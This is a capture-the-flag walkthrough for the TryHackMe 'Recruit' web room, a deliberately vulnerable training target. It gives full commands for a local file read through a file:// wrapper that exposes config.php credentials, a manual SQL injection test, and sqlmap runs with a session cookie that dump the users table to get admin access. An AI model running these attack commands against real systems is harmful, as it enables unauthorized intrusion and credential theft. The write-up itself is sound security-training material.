 # [TryHackMe: Recruit](https://tryhackme.com/room/recruitwebchallenge)

  ## Summary

  The machine is solved by chaining two web issues:

  1. Read the application config through the CV fetch feature
  2. Use the recovered HR account to access the dashboard
  3. Exploit SQL injection in the search parameter
  4. Extract the admin credential from the database
  5. Log in as admin

  ## Initial Enumeration

  Start with a standard scan:

  
  nmap -Pn -sC -sV -T4 <MACHINE_IP>
  
  The scan shows three interesting ports:

  - 22/tcp - SSH
  - 53/tcp - DNS
  - 80/tcp - HTTP

  The attack surface is clearly the web application on port 80.

  ## Web Enumeration

  Visiting the target shows a login page for Recruit. There is also a link to api.php, which is worth checking
  immediately.

  To map the site properly, run content discovery:

  ffuf -u http://<MACHINE_IP>/FUZZ \
    -w /usr/share/wordlists/dirb/common.txt \
    -e .php,.txt,.log,.bak \
    -fc 404

  Interesting findings:

  - /api.php
  - /file.php
  - /dashboard.php
  - /mail/
  - /phpmyadmin/

  The important paths for the intended route are /mail/, /api.php, and /file.php.

  ## Inspecting the Mail Logs

  The /mail/ directory is exposed and contains a log file:

  curl http://<MACHINE_IP>/mail/mail.log

  Reading the log gives a very useful deployment note:

  - the HR credential is stored in config.php
  - the administrator credential is stored in the backend database

  That tells us exactly what to do next.

  ## Understanding the API

  The API page explains that CVs can be fetched through a parameter like this:

  /file.php?cv=<value>

  Testing a normal external URL:

  curl "http://<MACHINE_IP>/file.php?cv=http://example.com"

  The response indicates that only local files are allowed.

  That is the hint. Instead of trying SSRF to external hosts, the right move is to test whether the application accepts
  a local file wrapper.

  ## Reading config.php

  Use the file:// wrapper against the vulnerable endpoint:

  curl "http://<MACHINE_IP>/file.php?cv=file://config.php"

  This returns the source of config.php.

  Inside the file, the temporary HR password is present in plain text. At this point we now have:

  - HR username: hr
  - HR password: <HR_PASSWORD_FROM_CONFIG>

  ## Logging In as HR

  Use the recovered credential in the login form, or do it from the terminal:

  curl -i -c cookies.txt -b cookies.txt \
    -d "username=hr&password=<HR_PASSWORD_FROM_CONFIG>&login=" \
    http://<MACHINE_IP>/

  A successful login redirects to dashboard.php.

  Opening the dashboard reveals the normal user flag:

  <USER_FLAG>

  The page also contains a candidate search form using the search GET parameter.

  ## Testing the Search Function

  The next step is to check whether the search field is vulnerable.

  A simple single quote is enough:

  curl -b cookies.txt "http://<MACHINE_IP>/dashboard.php?search=%27"

  This produces a MySQL syntax error in the response. That confirms SQL injection in the search parameter.

  ## Enumerating the Database with sqlmap

  Since the injection is inside an authenticated page, pass the session cookie to sqlmap.

  First enumerate the databases:

  sqlmap -u "http://<MACHINE_IP>/dashboard.php?search=test" \
    --cookie="PHPSESSID=<SESSION_COOKIE>" \
    -p search \
    --batch \
    --dbs

  Among the returned databases, the application database is clearly visible.

  List its tables:

  sqlmap -u "http://<MACHINE_IP>/dashboard.php?search=test" \
    --cookie="PHPSESSID=<SESSION_COOKIE>" \
    -p search \
    --batch \
    -D recruit_db \
    --tables

  A users table is present, which is the obvious target.

  Dump it:

  sqlmap -u "http://<MACHINE_IP>/dashboard.php?search=test" \
    --cookie="PHPSESSID=<SESSION_COOKIE>" \
    -p search \
    --batch \
    -D recruit_db \
    -T users \
    --dump

  This returns the administrator account and its password:

  - admin username: admin
  - admin password: <ADMIN_PASSWORD_FROM_DB>

  ## Logging In as Admin

  Now go back to the login page and sign in with the admin credential, or do it from the terminal:

  curl -s -c admin.txt -b admin.txt \
    -d "username=admin&password=<ADMIN_PASSWORD_FROM_DB>&login=" \
    http://<MACHINE_IP>/ -L

  After logging in as admin, the dashboard displays the second flag:

  <ADMIN_FLAG>

  ## Final Attack Chain

  The full solution path is:

  1. Enumerate the web application
  2. Read /mail/mail.log
  3. Learn that the HR password is stored in config.php
  4. Abuse file.php?cv=file://config.php
  5. Recover the HR credential
  6. Log in as hr
  7. Test the search parameter with '
  8. Confirm SQL injection from the SQL error
  9. Use sqlmap against the authenticated search parameter
  10. Dump recruit_db.users
  11. Recover the admin credential
  12. Log in as admin
  13. Read the admin flag

  ## Useful Commands

  ### Read the mail log

  curl http://<MACHINE_IP>/mail/mail.log

  ### Read the config file

  curl "http://<MACHINE_IP>/file.php?cv=file://config.php"

  ### Test the SQL injection manually

  curl -b cookies.txt "http://<MACHINE_IP>/dashboard.php?search=%27"

  ### Dump admin credentials with sqlmap

  sqlmap -u "http://<MACHINE_IP>/dashboard.php?search=test" \
    --cookie="PHPSESSID=<SESSION_COOKIE>" \
    -p search \
    --batch \
    -D recruit_db \
    -T users \
    --dump

  ## Conclusion

  Recruit is a short web challenge with a clean chain:

  - exposed logs reveal where the first credential is stored
  - the API helper allows local file access
  - the HR account unlocks the vulnerable dashboard
  - SQL injection on the search feature leads to admin access

  The machine is simple, but the path is neat and well structured.
